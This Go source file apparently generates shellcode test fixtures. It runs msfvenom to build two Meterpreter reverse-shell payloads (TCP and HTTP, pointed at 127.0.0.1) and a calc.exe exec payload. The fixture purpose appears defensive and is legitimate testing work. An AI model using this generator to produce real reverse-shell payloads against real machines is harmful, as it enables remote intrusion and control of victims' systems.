package main

import (
	"bytes"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

type payload struct {
	Filename string
	Args     []string
}

func main() {
	outDir := flag.String("out", "testdata", "output directory for generated shellcode fixtures")
	flag.Parse()

	if err := run(*outDir); err != nil {
		fmt.Fprintf(os.Stderr, "generation failed: %v\n", err)
		os.Exit(1)
	}
}

func run(outDir string) error {
	if _, err := exec.LookPath("msfvenom"); err != nil {
		return fmt.Errorf("msfvenom not found in PATH: %w", err)
	}

	payloads := []payload{
		{
			Filename: "windows-meterpreter-reverse-tcp.x64.bin",
			Args: []string{
				"-p", "windows/x64/meterpreter_reverse_tcp",
				"LHOST=127.0.0.1",
				"LPORT=4444",
			},
		},
		{
			Filename: "windows-meterpreter-reverse-http.x86.bin",
			Args: []string{
				"-p", "windows/meterpreter_reverse_http",
				"LHOST=127.0.0.1",
				"LPORT=8080",
			},
		},
		{
			Filename: "windows-exec-calc.x64.bin",
			Args: []string{
				"-p", "windows/x64/exec",
				"CMD=calc.exe",
			},
		},
	}

	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return fmt.Errorf("creating output directory: %w", err)
	}

	for _, payload := range payloads {
		if err := generatePayload(outDir, payload); err != nil {
			return err
		}
	}

	return nil
}

func generatePayload(outDir string, payload payload) error {
	outPath := filepath.Join(outDir, payload.Filename)

	args := append(payload.Args, "-f", "raw")

	cmd := exec.Command("msfvenom", args...) // #nosec G204 -- msfvenom invocation is intentional
	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	outFile, err := os.Create(outPath)
	if err != nil {
		return fmt.Errorf("creating %s: %w", outPath, err)
	}
	defer outFile.Close()

	cmd.Stdout = outFile

	if err := cmd.Run(); err != nil {
		_ = outFile.Close()
		return fmt.Errorf("msfvenom failed for %s: %w\n%s", payload.Filename, err, stderr.String())
	}

	return nil
}
